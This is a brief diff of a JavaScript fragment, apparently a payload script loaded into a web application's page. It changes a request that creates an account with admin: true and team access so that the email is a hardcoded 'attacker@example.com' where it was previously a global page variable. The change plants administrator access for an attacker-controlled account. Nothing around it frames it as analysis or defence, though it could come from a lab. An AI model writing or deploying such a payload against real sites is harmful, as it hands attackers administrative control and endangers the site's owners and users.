@@ -34,7 +34,7 @@ getAccounts.onreadystatechange = function () {
                     }
                 };
                 const requestBody = {
-                    email: window.email,  // Use the global email variable set before importing this script
+                    email: "attacker@example.com",
                     admin: true,
                     team_ids: [teamId]
                 };
